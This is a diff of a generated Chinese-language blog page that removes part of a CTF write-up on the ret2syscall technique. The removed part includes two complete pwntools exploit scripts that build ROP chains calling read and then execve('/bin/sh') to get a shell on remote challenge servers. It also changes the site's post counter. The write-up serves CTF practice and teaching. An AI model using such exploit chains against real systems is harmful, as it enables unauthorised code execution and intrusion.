-<p><img src="/2025/03/02/ret2syscall/image-20240524113426346.png" alt="image-20240524113426346"></p>
-<p>再找一个bss段的地址用于存放&#x2F;bin&#x2F;sh</p>
-<p><img src="/2025/03/02/ret2syscall/image-20240524113602768.png" alt="image-20240524113602768"></p>
-<p>exp：</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28311</span>)</span><br><span class="line">pop_rax=<span class="number">0x46b9f8</span></span><br><span class="line">pop_rdi=<span class="number">0x4016c3</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x4377f9</span></span><br><span class="line">bss=<span class="number">0x6c2000</span></span><br><span class="line">syscall=<span class="number">0x45BAC5</span> <span class="comment">#syscall</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0x0</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0x10</span>)+p64(bss)</span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rax)+p64(<span class="number">0x3b</span>)</span><br><span class="line">payload+=p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)</span><br><span class="line">payload+=p64(syscall)</span><br><span class="line"><span class="comment">#execve(“/bin/sh”,0,0)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)`</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="newstar2025-syscall"><a href="#newstar2025-syscall" class="headerlink" title="newstar2025 syscall"></a>newstar2025 syscall</h3><p>简单的ret2syscall</p>
-<p>构造rop链， <em>read(0, bss, 0x10),execve(“&#x2F;bin&#x2F;sh”, NULL, NULL)</em> </p>
-<p>寄存器用ROPgadget找，int_80要在IDA中手动找。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>,port)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">22</span></span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x080b438a</span></span><br><span class="line">pop_ebx = <span class="number">0x08049022</span></span><br><span class="line">pop_ecx = <span class="number">0x0804985a</span></span><br><span class="line">pop_edx = <span class="number">0x0804985c</span></span><br><span class="line">int80 = <span class="number">0x08073a00</span></span><br><span class="line">bss = <span class="number">0x80EE300</span>  +<span class="number">0x800</span></span><br><span class="line">read_addr = <span class="number">0x080497CE</span></span><br><span class="line">pop_ebx_esi_edi_ret=<span class="number">0x08049a1e</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(0, bss, 0x10)</span></span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(pop_ebx) + p32(<span class="number">0</span>) + p32(pop_ecx) + p32(bss) + p32(pop_edx) + p32(<span class="number">0x10</span>)</span><br><span class="line">payload += p32(int80)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;, NULL, NULL) </span></span><br><span class="line">payload += p32(pop_eax) + p32(<span class="number">0x0b</span>)</span><br><span class="line">payload += p32(pop_ebx) + p32(bss) + p32(pop_ecx) + p32(<span class="number">0</span>) + p32(pop_edx) + p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(int80)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;pwn it guys!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1976,7 +1952,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">82</span>
+          <span class="site-state-item-count">83</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
